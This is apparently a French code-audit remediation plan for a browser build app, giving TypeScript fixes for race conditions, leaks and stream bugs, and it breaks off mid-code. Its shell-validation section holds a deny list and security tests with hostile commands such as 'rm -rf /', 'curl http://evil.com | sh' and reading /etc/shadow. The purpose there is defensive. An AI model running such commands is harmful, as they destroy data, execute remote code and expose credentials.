# PLAN DE CORRECTION COMPLET - BAVINI-CLOUD

## Audit réalisé le 18 janvier 2026
## Estimation totale: 8-10 semaines

---

# TABLE DES MATIÈRES

1. [Phase 1 - Corrections Critiques (Semaine 1-2)](#phase-1---corrections-critiques-semaine-1-2)
2. [Phase 2 - Stabilisation (Semaine 3-4)](#phase-2---stabilisation-semaine-3-4)
3. [Phase 3 - Sécurité (Semaine 5-6)](#phase-3---sécurité-semaine-5-6)
4. [Phase 4 - Performance (Semaine 7-8)](#phase-4---performance-semaine-7-8)
5. [Phase 5 - Tests & Documentation (Semaine 9-10)](#phase-5---tests--documentation-semaine-9-10)
6. [Annexes](#annexes)

---

# PHASE 1 - CORRECTIONS CRITIQUES (Semaine 1-2)

## 1.1 Race Condition - Initialisation esbuild

### Problème
Deux adapters créés simultanément tentent d'initialiser esbuild-wasm deux fois, causant un crash.

### Fichier
`app/lib/runtime/adapters/browser-build-adapter.ts` (lignes 56-118)

### Solution détaillée

```typescript
// AVANT (problématique)
let globalEsbuildInitialized: boolean = (globalThis as any).__esbuildInitialized ?? false;

async init(): Promise<void> {
  if (globalEsbuildInitialized) {
    // ...
    return;
  }
  // Race condition ici!
  await esbuild.initialize({ wasmURL: ESBUILD_WASM_URL });
}

// APRÈS (corrigé)
let globalEsbuildInitialized: boolean = (globalThis as any).__esbuildInitialized ?? false;
let globalEsbuildPromise: Promise<void> | null = (globalThis as any).__esbuildPromise ?? null;

async init(): Promise<void> {
  // Si déjà initialisé, retourner immédiatement
  if (globalEsbuildInitialized) {
    logger.debug('esbuild already initialized globally, reusing');
    this._esbuildInitialized = true;
    this._status = 'ready';
    this.emitStatusChange('ready');
    return;
  }

  // Si initialisation en cours, attendre la Promise existante
  if (globalEsbuildPromise) {
    logger.debug('esbuild initialization in progress, waiting...');
    await globalEsbuildPromise;
    this._esbuildInitialized = true;
    this._status = 'ready';
    this.emitStatusChange('ready');
    return;
  }

  this._status = 'initializing';
  this.emitStatusChange('initializing');

  try {
    logger.info('Initializing esbuild-wasm...');

    // Créer la Promise AVANT d'appeler initialize pour éviter la race
    globalEsbuildPromise = esbuild.initialize({
      wasmURL: ESBUILD_WASM_URL,
    });
    (globalThis as any).__esbuildPromise = globalEsbuildPromise;

    await globalEsbuildPromise;

    // Marquer comme initialisé
    this._esbuildInitialized = true;
    globalEsbuildInitialized = true;
    (globalThis as any).__esbuildInitialized = true;

    this._status = 'ready';
    this.emitStatusChange('ready');

    logger.info('esbuild-wasm initialized successfully');
  } catch (error) {
    // Reset la Promise en cas d'erreur pour permettre retry
    globalEsbuildPromise = null;
    (globalThis as any).__esbuildPromise = null;

    this._status = 'error';
    this.emitStatusChange('error');
    logger.error('Failed to initialize esbuild-wasm:', error);
    throw error;
  }
}
```

### Étapes d'implémentation
1. [ ] Ouvrir `browser-build-adapter.ts`
2. [ ] Ajouter la variable `globalEsbuildPromise` ligne 57
3. [ ] Modifier la méthode `init()` selon le code ci-dessus
4. [ ] Tester avec deux instances simultanées
5. [ ] Vérifier le comportement HMR

### Tests à ajouter
```typescript
describe('BrowserBuildAdapter init', () => {
  it('should handle concurrent initialization calls', async () => {
    const adapter1 = new BrowserBuildAdapter();
    const adapter2 = new BrowserBuildAdapter();

    // Les deux doivent réussir sans erreur
    await Promise.all([adapter1.init(), adapter2.init()]);

    expect(adapter1.status).toBe('ready');
    expect(adapter2.status).toBe('ready');
  });

  it('should retry after initialization failure', async () => {
    // Mock esbuild.initialize pour échouer la première fois
    const adapter = new BrowserBuildAdapter();

    await expect(adapter.init()).rejects.toThrow();

    // Reset le mock pour réussir
    await adapter.init(); // Doit réussir maintenant
    expect(adapter.status).toBe('ready');
  });
});
```

### Critères de validation
- [ ] Pas d'erreur "esbuild already initialized" en console
- [ ] Deux onglets peuvent charger l'app simultanément
- [ ] HMR ne cause pas d'erreur d'init

---

## 1.2 Fuite Mémoire - Blob URLs

### Problème
Les Blob URLs créées pour les previews ne sont pas révoquées en cas d'erreur, causant une accumulation mémoire.

### Fichier
`app/lib/runtime/adapters/browser-build-adapter.ts` (lignes 1048-1081)

### Solution détaillée

```typescript
// AVANT (problématique)
private async createPreview(code: string, css: string, options: BuildOptions): Promise<void> {
  if (this._blobUrl) {
    URL.revokeObjectURL(this._blobUrl);
  }

  // ... création du HTML ...

  const blob = new Blob([html], { type: 'text/html' });
  this._blobUrl = URL.createObjectURL(blob);  // Si erreur après, jamais révoqué!

  this._preview = { /* ... */ };
  this.emitPreviewReady(this._preview);  // Peut lancer une exception
}

// APRÈS (corrigé)
private async createPreview(code: string, css: string, options: BuildOptions): Promise<void> {
  // Toujours révoquer l'ancienne URL en premier
  const oldBlobUrl = this._blobUrl;
  this._blobUrl = null;

  if (oldBlobUrl) {
    try {
      URL.revokeObjectURL(oldBlobUrl);
      logger.debug('Revoked old blob URL');
    } catch (e) {
      logger.warn('Failed to revoke old blob URL:', e);
    }
  }

  let newBlobUrl: string | null = null;

  try {
    // Find HTML template
    let htmlTemplate = this._files.get('/index.html') || this._files.get('/public/index.html');

    if (!htmlTemplate) {
      htmlTemplate = this.generateDefaultHtml(options);
    }

    // Inject bundle into HTML
    const html = this.injectBundle(htmlTemplate, code, css);

    // Create blob URL
    const blob = new Blob([html], { type: 'text/html' });
    newBlobUrl = URL.createObjectURL(blob);

    // Créer l'objet preview
    const preview: PreviewInfo = {
      url: newBlobUrl,
      ready: true,
      updatedAt: Date.now(),
    };

    // Seulement après succès, assigner aux propriétés d'instance
    this._blobUrl = newBlobUrl;
    this._preview = preview;

    logger.info('Emitting preview ready event:', this._blobUrl);
    this.emitPreviewReady(this._preview);

    logger.info('Preview created and callback emitted:', this._blobUrl);
  } catch (error) {
    // En cas d'erreur, nettoyer la nouvelle URL si elle a été créée
    if (newBlobUrl) {
      try {
        URL.revokeObjectURL(newBlobUrl);
        logger.debug('Cleaned up blob URL after error');
      } catch (e) {
        logger.warn('Failed to cleanup blob URL after error:', e);
      }
    }

    logger.error('Failed to create preview:', error);
    throw error;
  }
}
```

### Également modifier `destroy()`

```typescript
async destroy(): Promise<void> {
  logger.info('Destroying BrowserBuildAdapter...');

  const errors: Error[] = [];

  // Nettoyer le blob URL
  if (this._blobUrl) {
    try {
      URL.revokeObjectURL(this._blobUrl);
      logger.debug('Revoked blob URL during destroy');
    } catch (error) {
      logger.warn('Failed to revoke blob URL:', error);
      errors.push(error instanceof Error ? error : new Error(String(error)));
    }
    this._blobUrl = null;
  }

  // Nettoyer l'iframe
  if (this._previewIframe) {
    try {
      this._previewIframe.remove();
    } catch (error) {
      logger.warn('Failed to remove iframe:', error);
      errors.push(error instanceof Error ? error : new Error(String(error)));
    }
    this._previewIframe = null;
  }

  // Toujours nettoyer le reste
  this._files.clear();
  this._preview = null;
  this._status = 'idle';

  if (errors.length > 0) {
    logger.error('Cleanup completed with errors:', errors.length);
  }
}
```

### Étapes d'implémentation
1. [ ] Modifier `createPreview()` avec try/catch
2. [ ] Modifier `destroy()` avec gestion d'erreurs
3. [ ] Ajouter des logs de debug pour le suivi
4. [ ] Tester en provoquant des erreurs dans les callbacks

### Critères de validation
- [ ] Pas d'accumulation de blob: URLs dans DevTools > Application > Blob
- [ ] Memory profiler montre stabilité après 100 builds
- [ ] Erreurs dans callbacks n'empêchent pas le nettoyage

---

## 1.3 Complexité O(n²) - Streaming Chunks

### Problème
Chaque chunk reçu déclenche un `join()` de tous les chunks précédents, causant O(n²) opérations.

### Fichier
`app/components/chat/Chat.client.tsx` (lignes 787-880)

### Solution détaillée

```typescript
// AVANT (O(n²))
const contentChunks: string[] = [];

// Dans la boucle de streaming:
contentChunks.push(content);
const fullContent = contentChunks.join('');  // O(n) à chaque itération!
const newParsed = messageParser.parse(messageIdRef.current, fullContent);

// APRÈS (O(n) - parsing incrémental)
// Option 1: Utiliser un StringBuilder-like pattern
class ContentAccumulator {
  private chunks: string[] = [];
  private cachedFull: string | null = null;
  private lastParsedIndex: number = 0;

  push(chunk: string): void {
    this.chunks.push(chunk);
    this.cachedFull = null;  // Invalidate cache
  }

  getFull(): string {
    if (this.cachedFull === null) {
      this.cachedFull = this.chunks.join('');
    }
    return this.cachedFull;
  }

  getNewContent(): string {
    const full = this.getFull();
    const newContent = full.substring(this.lastParsedIndex);
    this.lastParsedIndex = full.length;
    return newContent;
  }

  reset(): void {
    this.chunks = [];
    this.cachedFull = null;
    this.lastParsedIndex = 0;
  }
}

// Option 2: Parsing incrémental (recommandé)
// Modifier messageParser pour accepter du contenu incrémental

// Dans Chat.client.tsx:
const accumulator = useRef(new ContentAccumulator());

// Dans la boucle:
accumulator.current.push(content);

// Parser seulement le nouveau contenu (si le parser le supporte)
// OU limiter les re-parse à des intervalles
const now = Date.now();
if (now - lastParseTime > 100) {  // Parse max toutes les 100ms
  const fullContent = accumulator.current.getFull();
  const newParsed = messageParser.parse(messageIdRef.current, fullContent);
  parsedContent = newParsed;
  lastParseTime = now;
}
```

### Solution alternative: Throttling du parsing

```typescript
// Utiliser un throttle pour limiter les re-parse
import { useCallback, useRef } from 'react';

function useThrottledParse(messageParser: MessageParser, delay: number = 100) {
  const lastParseTime = useRef(0);
  const pendingContent = useRef('');
  const timeoutRef = useRef<NodeJS.Timeout | null>(null);

  const parse = useCallback((messageId: string, content: string) => {
    pendingContent.current = content;

    const now = Date.now();
    const timeSinceLastParse = now - lastParseTime.current;

    if (timeSinceLastParse >= delay) {
      // Parse immédiatement
      lastParseTime.current = now;
      return messageParser.parse(messageId, content);
    } else {
      // Planifier un parse différé
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current);
      }

      return new Promise((resolve) => {
        timeoutRef.current = setTimeout(() => {
          lastParseTime.current = Date.now();
          resolve(messageParser.parse(messageId, pendingContent.current));
        }, delay - timeSinceLastParse);
      });
    }
  }, [messageParser, delay]);

  return parse;
}
```

### Étapes d'implémentation
1. [ ] Créer la classe `ContentAccumulator` dans un fichier utilitaire
2. [ ] Modifier `Chat.client.tsx` pour utiliser l'accumulator
3. [ ] Ajouter throttling du parsing (100ms minimum entre parses)
4. [ ] Tester avec des réponses de 100KB+
5. [ ] Mesurer les performances avant/après

### Critères de validation
- [ ] Réponse 1MB ne freeze pas l'UI
- [ ] Performance profiler montre O(n) au lieu de O(n²)
- [ ] Pas de perte de contenu lors du streaming

---

## 1.4 Sécurité - Validation Shell

### Problème
Les commandes shell non-whitelistées sont loggées comme warning mais exécutées quand même.

### Fichier
`app/lib/runtime/action-runner.ts` (lignes 165-190)

### Solution détaillée

```typescript
// AVANT (dangereux)
function validateShellCommand(command: string): { valid: boolean; reason?: string } {
  // ... patterns dangereux ...

  if (!isAllowed) {
    logger.warn(`Commande non whitelistée: ${mainCommand}`);
    // PROBLÈME: On continue et retourne valid: true!
  }

  return { valid: true };  // TOUJOURS true!
}

// APRÈS (sécurisé)
const ALLOWED_COMMAND_PREFIXES = [
  'npm', 'npx', 'yarn', 'pnpm', 'bun',  // Package managers
  'node', 'deno', 'tsx', 'ts-node',      // Runtimes
  'git',                                  // Version control
  'python', 'python3', 'pip', 'pip3',    // Python
  'cargo', 'rustc',                       // Rust
  'go',                                   // Go
  'java', 'javac', 'mvn', 'gradle',      // Java
  'cat', 'ls', 'pwd', 'echo', 'mkdir',   // Basic shell (read-only mostly)
  'cp', 'mv', 'rm',                       // File ops (avec restrictions)
  'curl', 'wget',                         // Downloads
  'tar', 'unzip', 'zip',                  // Archives
  'chmod',                                // Permissions
  'touch',                                // Create files
  'grep', 'find', 'head', 'tail',        // Text processing
];

const DANGEROUS_PATTERNS = [
  /\brm\s+-rf\s+[\/~]/i,                 // rm -rf avec chemin absolu
  /\bsudo\b/i,                            // sudo
  /\bsu\b/i,                              // su
  /\bchmod\s+777\b/i,                     // chmod 777
  /\bcurl\b.*\|\s*(ba)?sh/i,             // curl | sh (piping)
  /\bwget\b.*\|\s*(ba)?sh/i,             // wget | sh
  />\s*\/etc\//i,                         // Écriture dans /etc
  />\s*\/usr\//i,                         // Écriture dans /usr
  /\beval\b/i,                            // eval
  /\$\(/,                                 // Command substitution
  /`[^`]+`/,                              // Backtick execution
  /;\s*(rm|sudo|su|chmod|chown)\b/i,     // Chaining dangerous commands
  /&&\s*(rm|sudo|su|chmod|chown)\b/i,    // Chaining with &&
  /\|\|\s*(rm|sudo|su|chmod|chown)\b/i,  // Chaining with ||
];

function validateShellCommand(command: string): { valid: boolean; reason?: string } {
  const trimmedCommand = command.trim();

  // 1. Vérifier les patterns dangereux FIRST
  for (const pattern of DANGEROUS_PATTERNS) {
    if (pattern.test(trimmedCommand)) {
      logger.error(`BLOCKED dangerous command pattern: ${pattern.source}`);
      return {
        valid: false,
        reason: `Commande bloquée: pattern dangereux détecté (${pattern.source})`
      };
    }
  }

  // 2. Extraire la commande principale
  const mainCommand = trimmedCommand.split(/\s+/)[0].toLowerCase();

  // Gérer les chemins complets (/usr/bin/npm -> npm)
  const commandName = mainCommand.split('/').pop() || mainCommand;

  // 3. Vérifier la whitelist - DENY BY DEFAULT
  const isAllowed = ALLOWED_COMMAND_PREFIXES.some(
    prefix => commandName === prefix || commandName.startsWith(prefix + '.')
  );

  if (!isAllowed) {
    logger.warn(`BLOCKED non-whitelisted command: ${commandName}`);
    return {
      valid: false,
      reason: `Commande non autorisée: "${commandName}" n'est pas dans la liste blanche`
    };
  }

  // 4. Vérifications supplémentaires pour certaines commandes
  if (commandName === 'rm') {
    // rm autorisé seulement sans -rf sur chemins absolus
    if (/\s+-[a-z]*r[a-z]*f|\s+-[a-z]*f[a-z]*r/i.test(trimmedCommand)) {
      if (/\s+\//.test(trimmedCommand)) {
        return {
          valid: false,
          reason: 'rm -rf non autorisé sur les chemins absolus'
        };
      }
    }
  }

  logger.debug(`Command validated: ${commandName}`);
  return { valid: true };
}
```

### Également modifier l'appel dans runShellAction

```typescript
async #runShellAction(action: ActionState): Promise<void> {
  const validation = validateShellCommand(action.content);

  if (!validation.valid) {
    // IMPORTANT: Ne PAS exécuter, mettre en erreur
    this.#updateAction(action.actionId, {
      status: 'failed',
      error: validation.reason,
    });

    logger.error(`Shell command blocked: ${validation.reason}`);
    return;  // STOP - ne pas exécuter
  }

  // Continuer avec l'exécution seulement si valide
  // ...
}
```

### Étapes d'implémentation
1. [ ] Mettre à jour `ALLOWED_COMMAND_PREFIXES` avec toutes les commandes légitimes
2. [ ] Ajouter `DANGEROUS_PATTERNS` complet
3. [ ] Modifier `validateShellCommand()` pour deny-by-default
4. [ ] Modifier `#runShellAction()` pour bloquer les commandes invalides
5. [ ] Ajouter des tests de sécurité

### Tests de sécurité à ajouter

```typescript
describe('Shell command validation', () => {
  const dangerousCases = [
    'rm -rf /',
    'sudo apt install malware',
    'curl http://evil.com | sh',
    'echo "bad" > /etc/passwd',
    'npm install; rm -rf ~',
    '`whoami`',
    '$(cat /etc/shadow)',
  ];

  dangerousCases.forEach(cmd => {
    it(`should block dangerous command: ${cmd}`, () => {
      const result = validateShellCommand(cmd);
      expect(result.valid).toBe(false);
    });
  });

  const safeCases = [
    'npm install',
    'npm run build',
    'git status',
    'node index.js',
    'python script.py',
  ];

  safeCases.forEach(cmd => {
    it(`should allow safe command: ${cmd}`, () => {
      const result = validateShellCommand(cmd);
      expect(result.valid).toBe(true);
    });
  });
});
```

### Critères de validation
- [ ] `rm -rf /` est bloqué
- [ ] `curl | sh` est bloqué
- [ ] Commandes npm/git/node fonctionnent
- [ ] Logs montrent clairement les blocages

---

## 1.5 Boucle Infinie - Synchronisation Settings

### Problème
`buildSettingsStore` et `runtimeTypeStore` se synchronisent bidirectionnellement, causant potentiellement une boucle infinie.

### Fichier
`app/lib/stores/settings.ts` (lignes 111-121)

### Solution détaillée

```typescript
// AVANT (boucle potentielle)
buildSettingsStore.subscribe((settings) => {
  if (runtimeTypeStore.get() !== settings.engine) {
    runtimeTypeStore.set(settings.engine);  // Trigger l'autre subscribe!
  }
});

runtimeTypeStore.subscribe((type) => {
  if (buildSettingsStore.get().engine !== type) {
    buildSettingsStore.set({ engine: type });  // Trigger le premier!
  }
});

// APRÈS (source unique de vérité)
// Option 1: Supprimer la sync bidirectionnelle, utiliser une seule source

// Définir runtimeTypeStore comme la source de vérité
// buildSettingsStore.engine est dérivé de runtimeTypeStore

// Supprimer le subscribe de buildSettingsStore vers runtimeTypeStore
// Garder seulement:
runtimeTypeStore.subscribe((type) => {
  const current = buildSettingsStore.get();
  if (current.engine !== type) {
    buildSettingsStore.set({ ...current, engine: type });
  }
});

// Quand on veut changer l'engine, on modifie SEULEMENT runtimeTypeStore:
export function setRuntimeEngine(engine: RuntimeType): void {
  runtimeTypeStore.set(engine);
  // buildSettingsStore sera mis à jour automatiquement via le subscribe
}

// Option 2: Utiliser un flag de synchronisation
let isSyncing = false;

buildSettingsStore.subscribe((settings) => {
  if (isSyncing) return;

  if (runtimeTypeStore.get() !== settings.engine) {
    isSyncing = true;
    try {
      runtimeTypeStore.set(settings.engine);
    } finally {
      isSyncing = false;
    }
  }
});

runtimeTypeStore.subscribe((type) => {
  if (isSyncing) return;

  if (buildSettingsStore.get().engine !== type) {
    isSyncing = true;
    try {
      buildSettingsStore.set({ ...buildSettingsStore.get(), engine: type });
    } finally {
      isSyncing = false;
    }
  }
});
```

### Recommandation
Utiliser **Option 1** (source unique) car c'est plus propre et évite les bugs subtils.

### Étapes d'implémentation
1. [ ] Identifier quelle store doit être la source de vérité (recommandé: `runtimeTypeStore`)
2. [ ] Supprimer la sync de `buildSettingsStore` vers `runtimeTypeStore`
3. [ ] Créer une fonction helper `setRuntimeEngine()` pour les changements
4. [ ] Mettre à jour tous les endroits qui modifient `buildSettingsStore.engine`
5. [ ] Tester les changements de runtime

### Critères de validation
- [ ] Changer le runtime n'entre pas en boucle
- [ ] Les deux stores restent synchronisés
- [ ] Performance: pas de re-renders multiples

---

## 1.6 Race Condition - Singleton Factory

### Problème
`getRuntimeAdapter()` peut retourner deux instances différentes si appelé simultanément.

### Fichier
`app/lib/runtime/factory.ts` (lignes 66-85)

### Solution détaillée

```typescript
// AVANT (race condition)
let currentAdapter: RuntimeAdapter | null = null;
let currentType: RuntimeType | null = null;

export function getRuntimeAdapter(): RuntimeAdapter {
  const type = runtimeTypeStore.get();

  if (currentAdapter && currentType !== type) {
    currentAdapter.destroy().catch(console.error);
    currentAdapter = null;
  }

  if (!currentAdapter) {
    currentAdapter = createRuntimeAdapter(type);  // Race ici!
    currentType = type;
  }

  return currentAdapter;
}

// APRÈS (thread-safe avec Promise)
let currentAdapter: RuntimeAdapter | null = null;
let currentType: RuntimeType | null = null;
let adapterPromise: Promise<RuntimeAdapter> | null = null;
let isDestroying = false;

export async function getRuntimeAdapter(): Promise<RuntimeAdapter> {
  const type = runtimeTypeStore.get();

  // Si on est en train de détruire, attendre
  while (isDestroying) {
    await new Promise(resolve => setTimeout(resolve, 10));
  }

  // Si une création est en cours, attendre et vérifier le type
  if (adapterPromise) {
    const adapter = await adapterPromise;

    // Vérifier si le type a changé pendant l'attente
    if (currentType === type) {
      return adapter;
    }
    // Sinon, continuer pour créer un nouveau
  }

  // Si l'adapter existe et le type n'a pas changé
  if (currentAdapter && currentType === type) {
    return currentAdapter;
  }

  // Si le type a changé, détruire l'ancien
  if (currentAdapter && currentType !== type) {
    logger.info(`Runtime type changed from ${currentType} to ${type}, recreating adapter`);

    isDestroying = true;
    try {
      await currentAdapter.destroy();
    } catch (error) {
      logger.error('Failed to destroy previous adapter:', error);
    } finally {
      currentAdapter = null;
      isDestroying = false;
    }
  }

  // Créer le nouvel adapter avec Promise partagée
  adapterPromise = (async () => {
    const adapter = createRuntimeAdapter(type);
    await adapter.init();

    currentAdapter = adapter;
    currentType = type;
    adapterPromise = null;

    return adapter;
  })();

  return adapterPromise;
}

// Version synchrone pour les cas où on sait que l'adapter existe
export function getRuntimeAdapterSync(): RuntimeAdapter | null {
  return currentAdapter;
}

// Fonction pour forcer la recréation
export async function recreateRuntimeAdapter(): Promise<RuntimeAdapter> {
  if (currentAdapter) {
    isDestroying = true;
    try {
      await currentAdapter.destroy();
    } finally {
      currentAdapter = null;
      currentType = null;
      isDestroying = false;
    }
  }

  return getRuntimeAdapter();
}
```

### Mise à jour des appelants

```typescript
// AVANT
const adapter = getRuntimeAdapter();
adapter.doSomething();

// APRÈS
const adapter = await getRuntimeAdapter();
adapter.doSomething();

// OU pour les contextes synchrones où on sait que l'adapter existe
const adapter = getRuntimeAdapterSync();
if (adapter) {
  adapter.doSomething();
}
```

### Étapes d'implémentation
1. [ ] Modifier `getRuntimeAdapter()` pour être async
2. [ ] Ajouter `getRuntimeAdapterSync()` pour les cas synchrones
3. [ ] Mettre à jour tous les appelants (search: `getRuntimeAdapter()`)
4. [ ] Ajouter des tests de concurrence

### Critères de validation
- [ ] Appels simultanés retournent la même instance
- [ ] Changement de type détruit proprement l'ancien
- [ ] Pas de Promise non-résolues pendantes

---

## 1.7 Stream Consommé Deux Fois

### Problème
`getReader()` et `pipeTo()` sont appelés sur le même stream, ce qui est interdit.

### Fichier
`app/lib/runtime/action-runner.ts` (lignes 526, 596)

### Solution détaillée

```typescript
// AVANT (erreur)
// Ligne 526: Dans #waitForDevServerReady
const reader = process.output.getReader();

// Ligne 596: Dans autre fonction
process.output.pipeTo(new WritableStream({ ... }));
// ERREUR: stream déjà locked par getReader()!

// APRÈS (utiliser tee() pour dupliquer le stream)
async #handleDevServerOutput(process: WebContainerProcess): Promise<void> {
  // Dupliquer le stream en deux
  const [streamForReady, streamForLog] = process.output.tee();

  // Un stream pour détecter "ready"
  const readyPromise = this.#waitForDevServerReady(streamForReady);

  // L'autre stream pour le logging
  streamForLog.pipeTo(
    new WritableStream({
      write(data) {
        logger.debug('[Dev server output]', data);
      },
    }),
  ).catch(error => {
    logger.warn('Dev server log stream error:', error);
  });

  // Attendre que le serveur soit prêt
  await readyPromise;
}

// Modifier #waitForDevServerReady pour accepter un stream
async #waitForDevServerReady(outputStream: ReadableStream<string>): Promise<void> {
  const reader = outputStream.getReader();
  const startTime = Date.now();
  let resolved = false;

  try {
    while (!resolved) {
      const { done, value } = await reader.read();

      if (done) {
        break;
      }

      // Vérifier timeout
      if (Date.now() - startTime > DEV_SERVER_READY_TIMEOUT_MS) {
        logger.warn(`Dev server ready timeout after ${DEV_SERVER_READY_TIMEOUT_MS}ms`);
        break;
      }

      // Chercher les patterns "ready"
      if (value && this.#isDevServerReady(value)) {
        resolved = true;
        break;
      }
    }
  } finally {
    // IMPORTANT: Toujours relâcher le reader
    reader.releaseLock();
  }
}

#isDevServerReady(output: string): boolean {
  const readyPatterns = [
    /ready in \d+/i,
    /listening on/i,
    /started server/i,
    /local:\s+http/i,
    /server running/i,
  ];

  return readyPatterns.some(pattern => pattern.test(output));
}
```

### Alternative: Utiliser TransformStream

```typescript
// Créer un stream qui observe et forward
function createObservableStream(
  onData: (data: string) => void
): TransformStream<string, string> {
  return new TransformStream({
    transform(chunk, controller) {
      onData(chunk);
      controller.enqueue(chunk);
    },
  });
}

// Utilisation
const observable = createObservableStream((data) => {
  logger.debug('[Dev server]', data);

  if (this.#isDevServerReady(data)) {
    resolveReady();
  }
});

process.output
  .pipeThrough(observable)
  .pipeTo(terminalWritable);
```

### Étapes d'implémentation
1. [ ] Identifier tous les endroits où `process.output` est utilisé
2. [ ] Implémenter `tee()` pour dupliquer le stream
3. [ ] Modifier `#waitForDevServerReady()` pour accepter un stream
4. [ ] S'assurer que les readers sont toujours relâchés
5. [ ] Tester le dev server startup

### Critères de validation
- [ ] Dev server output visible dans les logs
- [ ] "ready" détecté correctement
- [ ] Pas d'erreur "stream locked"

---

## 1.8 Listeners Non-Nettoyés

### Problème
Les event listeners dans `checkpointsStore` et `workbenchStore` ne sont pas automatiquement nettoyés.

### Fichiers
- `app/lib/stores/checkpoints.ts` (lignes 330-336)
- `app/lib/stores/workbench.ts` (lignes 295-308)

### Solution pour checkpoints.ts

```typescript
// AVANT
const eventListeners = new Set<(event: CheckpointEvent) => void>();

export function subscribeToEvents(listener: (event: CheckpointEvent) => void): () => void {
  eventListeners.add(listener);

  return () => {
    eventListeners.delete(listener);
  };
}

// APRÈS (avec auto-cleanup et limite)
const MAX_LISTENERS = 100;
const eventListeners = new Map<
  (event: CheckpointEvent) => void,
  { addedAt: number; cleanupFn?: () => void }
>();

export function subscribeToEvents(
  listener: (event: CheckpointEvent) => void,
  options?: { autoCleanupMs?: number }
): () => void {
  // Prévenir trop de listeners
  if (eventListeners.size >= MAX_LISTENERS) {
    // Supprimer le plus ancien
    const oldest = [...eventListeners.entries()]
      .sort((a, b) => a[1].addedAt - b[1].addedAt)[0];

    if (oldest) {
      logger.warn('Max listeners reached, removing oldest');
      oldest[1].cleanupFn?.();
      eventListeners.delete(oldest[0]);
    }
  }

  const metadata: { addedAt: number; cleanupFn?: () => void } = {
    addedAt: Date.now(),
  };

  const cleanup = () => {
    eventListeners.delete(listener);
    logger.debug('Checkpoint event listener removed');
  };

  metadata.cleanupFn = cleanup;
  eventListeners.set(listener, metadata);

  // Auto-cleanup optionnel
  if (options?.autoCleanupMs) {
    setTimeout(cleanup, options.autoCleanupMs);
  }

  logger.debug(`Checkpoint event listener added (total: ${eventListeners.size})`);

  return cleanup;
}

// Fonction pour nettoyer tous les listeners
export function clearAllEventListeners(): void {
  const count = eventListeners.size;
  eventListeners.clear();
  logger.info(`Cleared ${count} checkpoint event listeners`);
}
```

### Solution pour workbench.ts

```typescript
// AVANT (problème: unsubscribe conditionnel)
const unsubscribe = chatId.subscribe(async (newChatId) => {
  if (newChatId && browserFilesStore.getAllFiles().size === 0) {
    // ...
    unsubscribe();  // Seulement appelé si condition vraie!
  }
});

// APRÈS (cleanup garanti)
class WorkbenchStore {
  private subscriptions: (() => void)[] = [];

  constructor() {
    // ... autres initialisations ...

    this.#setupChatIdSubscription();
  }

  #setupChatIdSubscription(): void {
    let hasLoadedOnce = false;

    const unsubscribe = chatId.subscribe(async (newChatId) => {
      if (hasLoadedOnce) return;  // Ne charger qu'une fois

      if (newChatId && browserFilesStore.getAllFiles().size === 0) {
        hasLoadedOnce = true;
        logger.info(`ChatId set to ${newChatId}, loading files from checkpoint`);
        await loadFilesFromCheckpointHelper(newChatId);
      }
    });

    // Enregistrer pour cleanup
    this.subscriptions.push(unsubscribe);
  }

  // Méthode de cleanup publique
  destroy(): void {
    logger.info('Destroying WorkbenchStore...');

    // Cleanup toutes les subscriptions
    this.subscriptions.forEach(unsub => {
      try {
        unsub();
      } catch (e) {
        logger.warn('Error during subscription cleanup:', e);
      }
    });
    this.subscriptions = [];

    // Cleanup debounce timer
    if (this.#buildDebounceTimer) {
      clearTimeout(this.#buildDebounceTimer);
      this.#buildDebounceTimer = null;
    }

    // Cleanup browser build service
    if (this.#browserBuildService) {
      this.#browserBuildService.destroy().catch(e => {
        logger.warn('Error destroying browser build service:', e);
      });
      this.#browserBuildService = null;
    }

    logger.info('WorkbenchStore destroyed');
  }
}

// Appeler destroy() quand approprié (ex: changement de page)
```

### Étapes d'implémentation
1. [ ] Ajouter limite de listeners dans `checkpoints.ts`
2. [ ] Ajouter `clearAllEventListeners()` dans `checkpoints.ts`
3. [ ] Créer méthode `destroy()` dans `WorkbenchStore`
4. [ ] Tracker toutes les subscriptions dans un tableau
5. [ ] Appeler `destroy()` aux moments appropriés

### Critères de validation
- [ ] Memory profiler montre stabilité des listeners
- [ ] Logs montrent les cleanup
- [ ] Pas de listeners orphelins après navigation

---

# PHASE 2 - STABILISATION (Semaine 3-4)

## 2.1 Path Traversal Fix

### Fichier
`app/lib/runtime/adapters/browser-build-adapter.ts` (lignes 890-904)

### Solution

```typescript
private resolveRelativePath(importer: string, relativePath: string): string {
  const importerDir = importer.substring(0, importer.lastIndexOf('/')) || '/';
  const parts = [...importerDir.split('/'), ...relativePath.split('/')];
  const resolved: string[] = [];

  for (const part of parts) {
    if (part === '..') {
      // Ne JAMAIS remonter au-delà de la racine
      if (resolved.length > 0) {
        resolved.pop();
      } else {
        logger.warn(`Path traversal attempt blocked: ${relativePath}`);
        // Ne pas pop, ignorer le ..
      }
    } else if (part !== '.' && part !== '') {
      resolved.push(part);
    }
  }

  const finalPath = '/' + resolved.join('/');

  // Validation supplémentaire: vérifier que le chemin est safe
  if (this.#isPathSafe(finalPath)) {
    return finalPath;
  }

  logger.error(`Unsafe path rejected: ${finalPath}`);
  throw new Error(`Invalid path: ${relativePath}`);
}

#isPathSafe(path: string): boolean {
  // Doit commencer par /
  if (!path.startsWith('/')) return false;

  // Ne doit pas contenir de séquences dangereuses
  const dangerousPatterns = [
    /\.\./,           // Parent directory
    /\/\//,           // Double slash
    /%2e/i,           // URL encoded .
    /%2f/i,           // URL encoded /
    /\\/,             // Backslash
  ];

  return !dangerousPatterns.some(p => p.test(path));
}
```

---

## 2.2 Module Cache LRU

### Fichier
`app/lib/runtime/adapters/browser-build-adapter.ts` (ligne 45)

### Solution

```typescript
// Créer une classe LRU Cache
class LRUCache<K, V> {
  private cache = new Map<K, { value: V; lastAccess: number }>();
  private maxSize: number;
  private maxAge: number;

  constructor(maxSize: number = 100, maxAgeMs: number = 3600000) {
    this.maxSize = maxSize;
    this.maxAge = maxAgeMs;
  }

  get(key: K): V | undefined {
    const entry = this.cache.get(key);

    if (!entry) return undefined;

    // Vérifier l'expiration
    if (Date.now() - entry.lastAccess > this.maxAge) {
      this.cache.delete(key);
      return undefined;
    }

    // Mettre à jour lastAccess
    entry.lastAccess = Date.now();
    return entry.value;
  }

  set(key: K, value: V): void {
    // Éviction si nécessaire
    if (this.cache.size >= this.maxSize) {
      this.evictOldest();
    }

    this.cache.set(key, { value, lastAccess: Date.now() });
  }

  has(key: K): boolean {
    return this.get(key) !== undefined;
  }

  private evictOldest(): void {
